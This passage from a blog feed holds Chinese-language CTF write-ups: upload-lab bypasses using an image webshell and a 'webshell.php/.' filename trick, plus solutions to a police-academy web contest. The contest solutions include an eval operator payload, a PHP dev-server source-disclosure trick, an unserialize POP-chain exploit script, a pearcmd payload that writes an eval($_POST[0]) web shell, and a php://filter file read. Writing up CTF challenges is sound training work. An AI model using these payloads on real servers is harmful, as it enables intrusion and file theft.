class="title">MyUpload</span></span>&#123;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">  <span class="keyword">var</span> <span class="variable">$cls_arr_ext_accepted</span> = <span class="keyword">array</span>(</span><br><span class="line">      <span class="string">&quot;.doc&quot;</span>, <span class="string">&quot;.xls&quot;</span>, <span class="string">&quot;.txt&quot;</span>, <span class="string">&quot;.pdf&quot;</span>, <span class="string">&quot;.gif&quot;</span>, <span class="string">&quot;.jpg&quot;</span>, <span class="string">&quot;.zip&quot;</span>, <span class="string">&quot;.rar&quot;</span>, <span class="string">&quot;.7z&quot;</span>,<span class="string">&quot;.ppt&quot;</span>,</span><br><span class="line">      <span class="string">&quot;.html&quot;</span>, <span class="string">&quot;.xml&quot;</span>, <span class="string">&quot;.tiff&quot;</span>, <span class="string">&quot;.jpeg&quot;</span>, <span class="string">&quot;.png&quot;</span> );</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......  </span><br><span class="line">  <span class="comment">/** upload()</span></span><br><span class="line"><span class="comment">   **</span></span><br><span class="line"><span class="comment">   ** Method to upload the file.</span></span><br><span class="line"><span class="comment">   ** This is the only method to call outside the class.</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@para</span> String name of directory we upload to</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@returns</span> void</span></span><br><span class="line"><span class="comment">  **/</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"> <span class="variable">$dir</span> </span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">isUploadedFile</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">setDir</span>( <span class="variable">$dir</span> );</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkExtension</span>();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkSize</span>();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if flag to check if the file exists is set to 1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( <span class="variable language_">$this</span>-&gt;cls_file_exists == <span class="number">1</span> )&#123;</span><br><span class="line">      </span><br><span class="line">      <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkFileExists</span>();</span><br><span class="line">      <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if we are here, we are ready to move the file to destination</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">move</span>();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check if we need to rename the file</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable language_">$this</span>-&gt;cls_rename_file == <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">renameFile</span>();</span><br><span class="line">      <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if we are here, everything worked as planned :)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="string">&quot;SUCCESS&quot;</span> );</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="方法一-2"><a href="#方法一-2" class="headerlink" title="方法一"></a>方法一</h2><p>直接上传图片马即可，可以在返回页面中得到图片名称</p><h1 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$UPLOAD_ADDR</span>)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file_name</span>,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$img_path</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$img_path</span>)) &#123; </span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传失败！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;禁止保存为该类型文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="解法-14"><a href="#解法-14" class="headerlink" title="解法"></a>解法</h2><p><code>move_uploaded_file</code>这个函数会忽略<code>/</code>，因此可以修改上传的文件名为：<code>webshell.php/.</code>即可成功上传，测试连接成功。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>黄河流域公安院校网络空间安全技能挑战赛WP</title>
      <link href="/2023/03/12/%E9%BB%84%E6%B2%B3%E6%B5%81%E5%9F%9F%E5%85%AC%E5%AE%89%E9%99%A2%E6%A0%A1%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9BWP/"/>
      <url>/2023/03/12/%E9%BB%84%E6%B2%B3%E6%B5%81%E5%9F%9F%E5%85%AC%E5%AE%89%E9%99%A2%E6%A0%A1%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9BWP/</url>
      
        <content type="html"><![CDATA[<blockquote><p>WP原文：<a href="https://rb61qxxiv7.feishu.cn/docs/doccnFcZA8xHDlJNUFQs4QEXqvg#">https://rb61qxxiv7.feishu.cn/docs/doccnFcZA8xHDlJNUFQs4QEXqvg#</a></p></blockquote><blockquote><p>就做出来了一个ezphp，而且还是靠google原题嗯抄的，学习之路真是任重而道远。</p></blockquote><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678004599199-79d1bc55-533b-463b-b116-f14a209b86d7.png" alt="9956ef16896bd6c730cea9b401218c2.png"></p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="babyPHP"><a href="#babyPHP" class="headerlink" title="babyPHP"></a>babyPHP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&#x27;|\&quot;|\`| |&lt;|&gt;|?|\^|%|\$/&quot;</span>, <span class="variable">$num</span>)) &#123;</span><br><span class="line">           <span class="keyword">die</span>(<span class="string">&quot;nononno&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">eval</span>(<span class="string">&quot;return $&#123;num&#125; != 2;&quot;</span>) &amp;&amp; <span class="variable">$num</span> == <span class="number">0</span> &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>) != <span class="literal">true</span>) &#123;</span><br><span class="line"> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat flag.php&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目主要考察的是php的运算符的比较级。<br>payload：<code>?num=1|2</code><br>flag在源代码里面。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678001464588-77225b4a-cf0b-4a51-8212-30b8bd77afa1.png" alt="image.png"></p><h2 id="funnyPHP"><a href="#funnyPHP" class="headerlink" title="funnyPHP"></a>funnyPHP</h2><p>上来给出的地址是：<code>/hint.php</code>，页面下为<code>phpinfo()</code>参数页面：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678001660449-14587bf3-10c9-476f-a1e9-22d501efdc52.png" alt="image.png"><br>访问根目录<code>/</code>出现以下情况：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678001606854-f0128886-182c-4eb5-9172-6c0387e9e027.png" alt="image.png"><br>这里为 PHP Development Server 启动的服务。然后就出现了本题的考点：</p><h3 id="PHP-lt-7-4-21-Development-Server源码泄露漏洞"><a href="#PHP-lt-7-4-21-Development-Server源码泄露漏洞" class="headerlink" title="PHP&lt;=7.4.21 Development Server源码泄露漏洞"></a>PHP&lt;=7.4.21 Development Server源码泄露漏洞</h3><blockquote><p><a href="https://cn-sec.com/archives/1530845.html">https://cn-sec.com/archives/1530845.html</a><br><a href="https://blog.projectdiscovery.io/php-http-server-source-disclosure/">https://blog.projectdiscovery.io/php-http-server-source-disclosure/</a></p></blockquote><p>我最开始在bp中手动输入那个\r\n但是发现不行，经过尝试才知道需要先关闭<code>Updates COntentLength</code>并且打开<code>hide non—printable chars</code>，这两个分别在以下位置：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678002498712-172f96c6-35b8-4f31-b5f9-d17c822dc312.png" alt="image.png"><br>和<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678002518945-25f2f952-9851-4f47-ba31-d199acf26ce3.png" alt="image.png"><br>分别打开之后，按照以下格式发送即可。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678002554239-5388e99a-8075-4082-a0a1-3b696ffb131b.png" alt="image.png"><br>之后就能够获得到puzzle.php的内容。其中考察的是php的反序列化。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sdpc</span> = [<span class="string">&quot;welcome&quot;</span> =&gt; <span class="string">&quot;yeah, something hidden.&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$name</span>[<span class="variable">$name</span>]();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a-&gt;sdpc[<span class="string">&quot;welcome&quot;</span>]; <span class="comment">//对大家表示欢迎</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b ? <span class="variable language_">$this</span>-&gt;c-&gt;<span class="title function_ invoke__">sdpc</span>(<span class="string">&#x27;welcom&#x27;</span>) : <span class="string">&#x27;welcome!&#x27;</span>.<span class="variable language_">$this</span>-&gt;c; <span class="comment">//变着法欢迎大家</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/fl4g&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;sdpc&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;sdpc&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">C</span>());</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>exp.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sdpc</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sdpc = <span class="keyword">array</span>(<span class="string">&quot;sdpc&quot;</span> =&gt; <span class="keyword">array</span>(<span class="keyword">new</span> <span class="title class_">Evil</span>(),<span class="string">&#x27;getflag&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$name</span>[<span class="variable">$arguments</span>]();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a-&gt;sdpc[<span class="string">&quot;welcome&quot;</span>]; <span class="comment">//对大家表示欢迎</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b ? <span class="variable language_">$this</span>-&gt;c-&gt;<span class="title function_ invoke__">sdpc</span>(<span class="string">&#x27;welcom&#x27;</span>) : <span class="string">&#x27;welcome!&#x27;</span> . <span class="variable language_">$this</span>-&gt;c; <span class="comment">//设置 b ，触发 ___call</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/fl4g&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ca</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$cb</span> = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$cc</span> = <span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$cc</span>-&gt;b = <span class="string">&#x27;sp4c1ous&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$cc</span>));</span><br></pre></td></tr></table></figure><p>用post传入：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678003313844-de470c08-436b-496a-b1f6-193a5bd1252e.png" alt="image.png"></p><h2 id="ezinclude"><a href="#ezinclude" class="headerlink" title="ezinclude"></a>ezinclude</h2><blockquote><p><a href="https://blog.csdn.net/RABCDXB/article/details/122050370">https://blog.csdn.net/RABCDXB/article/details/122050370</a></p></blockquote><p>pearcmd的利用，但是并不会。先把官方wp粘在这里吧。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?+config-create+/&amp;sdpc=/usr/local/lib/php/pearcmd.php&amp;/<span class="meta">&lt;?</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">0</span>]);<span class="meta">?&gt;</span>+/tmp/hello.php</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678004112573-9e6a567b-86ce-4314-b98e-99214b391728.png" alt="output.png"></p><h2 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h2><blockquote><p><a href="https://www.anquanke.com/post/id/284901">https://www.anquanke.com/post/id/284901</a></p></blockquote><p>就做出来了这一个，还是抄的。。。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677900359894-8183856c-3d9a-409b-9d34-eea5aff2dcb3.png" alt="image.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$g</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;g&#x27;</span>];</span><br><span class="line"><span class="variable">$t</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;t&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable">$g</span>(<span class="variable">$t</span>);</span><br></pre></td></tr></table></figure><p>根据图片，直接传入payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?g=<span class="built_in">SplFileObject</span>&amp;t=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2><meta name="referrer" content="no-referrer" />]]></content>
      
      
